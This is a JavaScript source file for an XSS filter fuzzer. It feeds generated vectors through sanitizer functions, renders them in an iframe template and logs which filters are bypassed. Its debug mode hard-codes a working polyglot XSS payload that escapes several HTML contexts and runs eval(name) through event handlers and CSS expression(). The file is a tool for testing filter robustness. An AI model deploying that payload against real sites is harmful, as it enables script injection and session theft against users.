var FuzzRunner = (function() {
  var runner = {};


//startup:
  var filterNo = 0;
  var tmplNo = 0;
  var tmplMax = 5;
  var tested = {}; // used as hashtable to find vectors already used
  var vector;
  var bypassed = {}; // as a [filterNo][tmplNo] dict
  for (var i=0; i<tmplMax; i++) {
    bypassed['tmpl'+ i] = {}
    for (var j=0; j<filters.length; j++) {
      bypassed['tmpl'+ i]['filter'+j] = false
    }
  }
  function executeTest() {
    if (tmplNo == tmplMax) { // next filter, if done with all templates
      tmplNo = tmplNo % tmplMax;
      filterNo++;
    }
    if (filterNo >= filters.length) { // Next vector if done with all filters
      console.log("Done through all filters. Next Vector.");
      if (CONFIG.debug) { // debug, if we do not want to try vectors other than the first one.
        return;
      }

      filterNo = 0; tmplNo = 0;
      try {
        vector = Producer.getNewVector("CAP_EXECUTE_SCRIPT");
      }
      catch(e) {
        // Could not produce new erorrs.
        runner.finished = + (+(new Date()));
        console.log((runner.finished - runner.started) / 60000 +' minutes', Object.keys(Producer.tested).length + ' tests')
        return
      }
      console.log("New: "+ vector)
    }
    if (bypassed['tmpl'+tmplNo]['filter'+filterNo] !== false) {
      if (CONFIG.debug) {
        console.log("Skipping test for template " + (['in HTML', 'in an attribute (double-quote)', 'in a comment', 'in a attribute (single-quote)'])[tmplNo] +" and filter "+ (filters[filterNo][0].name || /function ([\S]+)\(.*/.exec(filters[filterNo][0])[1] || "unnamed function"));
      }
      tmplNo++;
      //XXX nasty hack to trigger next execution:
      frames[0].name = "";
      frames[0].document.location = "about:blank";
      return;
    }
    var filterFunc = filters[filterNo][0];
    var filteredVector = filterFunc(vector);

    if (CONFIG.debug) {
      console.log("Trying Vector: " + vector);
      console.log("Filtered: " + filteredVector);
    }
    //TODO test other thing than "just" script execution as a filter violation.
    frames[0].name = btoa(["Filter", filterNo, "Template Part", tmplNo, "Vector", vector].join("|"));
    try {
      frames[0].document.location = 'template.php?tid=' + tmplNo + '&input=' + encodeURIComponent(btoa(filteredVector));
      if (CONFIG.debug) { //TODO decide if this is only debug ---v
        document.querySelector("#debug").value = frames[0].document.body.innerHTML;
      }
    } catch (e) {}
    //addToLog(filterNo, tmplNo, vector, "pending/safe");

    tmplNo++;
  }

  function start() {
    if (vector === undefined) {
      if (CONFIG.debug) {
        // "one vector to rule them all"
        vector = (new String("javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>\">[img=1,name=top.postMessage([window.location.href,window.name],/\\*/.source.slice(1))]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=top.postMessage([window.location.href,window.name],/\\*/.source.slice(1)) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>\""))
      } else {
      vector = Producer.getNewVector("CAP_EXECUTE_SCRIPT");
      }
    }
    executeTest(vector);
  }


  function updateLog(info, status) {
    try {
      var td = document.getElementById(info);
      td.textContent = status;
      td.className = (status == "bypass") ? "bypass" : "safe";
      return true;
    }
    catch(e) { return false; }
  }

  function addToLog(filterNo, tmplNo, Vector, status) {
    if (bypassed['tmpl'+tmplNo]['filter'+filterNo] !== false) {
      return // do not log vector for this combination twice.
    }
    bypassed['tmpl'+tmplNo]['filter'+filterNo] = Vector;
    var tmplNames = ['in HTML', 'img tag src attribute, double quoted', 'in a comment', 'img tag src attribute, single quoted', 'a tag title attribute, unquoted'];
    if (tmplNo < tmplNames.length) {
      tmplDesc = tmplNames[tmplNo];
    }
    // get function name. for IE we have to RegExp it out of the function source.
    var filterName = filters[filterNo][0].name || /function ([\S]+)\(.*/.exec(filters[filterNo][0])[1] || "unnamed function";

    var tr = document.createElement('TR');

    // Filter Name
    var td = document.createElement('TD');
    tr.appendChild(td);
    var text = document.createTextNode(filterName);
    td.appendChild(text);
    td.title = filters[filterNo][1];

    // Template description
    var td_0 = document.createElement('TD');
    tr.appendChild(td_0);
    var text_0 = document.createTextNode(tmplDesc);
    td_0.appendChild(text_0);

    // Vector as string
    var td_1 = document.createElement('TD');
    tr.appendChild(td_1);
    var pre = document.createElement('PRE')
    var text_1 = document.createTextNode(Vector);
    pre.appendChild(text_1)
    td_1.appendChild(pre);
    td_1.className = "vector";

    // filtered Vector as string
    var td_2a = document.createElement('TD');
    tr.appendChild(td_2a);
    var pre_0 = document.createElement('PRE')
    var text_2a = document.createTextNode( filters[filterNo][0](Vector) );
    pre_0.appendChild(text_2a)
    td_2a.appendChild(pre_0);
    td_2a.className = "filteredvector";

    // Result
    var td_2 = document.createElement('TD');
    tr.appendChild(td_2);
    var text_2 = document.createTextNode(status);
    td_2.id = btoa(["Filter", filterNo, "Template Part", tmplNo, "Vector", vector].join("|"));
    td_2.className = "pending";
    td_2.appendChild(text_2);

    var table = document.querySelector("#resultTable");
    table.appendChild(tr);
  }
  function updateLog(info, status) {
    try {
      var td = document.getElementById(info);
      td.textContent = status;
      td.className = (status == "bypass") ? "bypass" : "safe";
      return true;
    }
    catch(e) { return false; }
  }

  function stahp() {
    nextTest = function() { };
  }

  runner.addToLog = addToLog;
  runner.updateLog = updateLog;
  runner.start = start;
  runner.stop = stahp; // ...
  runner.bypassed = bypassed;
  return runner;
})();